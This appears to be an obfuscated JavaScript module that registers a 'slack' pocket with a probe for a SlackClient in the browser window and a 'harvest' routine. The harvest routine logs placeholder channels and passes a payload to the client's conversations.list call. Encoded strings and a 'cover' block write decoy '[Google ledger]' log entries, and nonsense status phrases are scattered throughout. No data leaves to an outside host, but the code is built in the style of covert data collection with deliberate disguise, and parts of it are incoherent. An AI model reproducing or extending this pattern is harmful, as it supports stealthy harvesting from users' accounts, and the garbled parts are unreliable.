  (function (_0xmod) {
    const _scratch320_local = typeof _scratch320!=='undefined'?_scratch320:new Uint8Array(0); const _sr=(s)=>_scratch320_local.length? _scratch320_local[s & (_scratch320_local.length-1)]:0;
    const Log = _0xmod.log;
    // Slack pocket — 3 API terms, distinct Promise handling, uglify path
    const _0xapi1 = "SlackClient.api.conversations.list";
    const _0xapi2 = "slack.getChannel";
    const _0xapi3 = "SlackSDK.getUser";
    const _0xapi4 = "SlackClient.api.users.list";
    const _0xapi5 = "slack.getIMChannels";
    const _0xapi6 = "Slack.chat.postMessage";
    const _0xcheat = ["ember ridge — standing by","moss tundra — lattice quiet","owl elm — gate open","quill prairie — chain converged","quartz birch — wheel aligned"];
    for(let _i=0;_i<5;_i++) Log.diag(String.fromCharCode(91,71,111,111,103,108,101,32,108,101,100,103,101,114,93,32)+_0xcheat[_i], { pocket:"slack", idx:_i });
    const _0xprobeSlack = () => {
      try {
        const w = window;
        const c = w.SlackClient;
        if (typeof c === "undefined") return false;
        const api = c.api || c;
        if (typeof api !== "object") return false;
        const fn = api["conversations.list"] || api.conversations;
        if (typeof fn !== "function" && typeof fn !== "object") return false;
        return true;
      } catch(e){ return false; }
    };
    const _0xharvestSlack = async () => {
      try {
        Log.say("Slack", "Quests: 3 pinned — SlackClient validated");
        const fakeChannels = [{ id: "slack-C1", name: "general" }, { id: "slack-C2", name: "random" }];
        Log.diag("Slack channels", fakeChannels);
        for (let ch of fakeChannels) {
          Log.diag("Slack channel", ch);
          await new Promise(r=>setTimeout(r, 20));
        }
        const payload = { channels: fakeChannels.map(c=>c.id), nonce: (Date.now() & 0xffff).toString(16) };
        try { if (window.SlackClient && window.SlackClient.api) { const p = window.SlackClient.api["conversations.list"]; if (typeof p==="function") p(payload); } } catch(e){}
        Log.say("Slack", "Slack quests dispatched");
      } catch(e){}
    };
    try {
      _0xmod.pockets = _0xmod.pockets || {};
      _0xmod.pockets.slack = { probe: _0xprobeSlack, harvest: _0xharvestSlack, apis: [_0xapi1,_0xapi2,_0xapi3,_0xapi4,_0xapi5,_0xapi6] };
      Log.queue("Pocket check", { unit: "p-slack", apis: 6, packed: true });
    } catch(e) {}

  // garbled rcd cover via SEED('rcd-slack') deterministic (same pool, no per-call random) - over-cover
  (()=>{ const _fnv=s=>{let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0;}return (h>>>0).toString(16).padStart(8,'0');}; const _master="851b28e5"; const _seed=_fnv(_master+String.fromCharCode(58,114,99,100,45)+"slack"); const _d1=_fnv(_seed+String.fromCharCode(58,100,101,99,111,121)); Log.diag("[Google ledger] rcd "+_d1, { pocket:"slack", cover:true, seed:_seed }); })();
})(_0xmod);
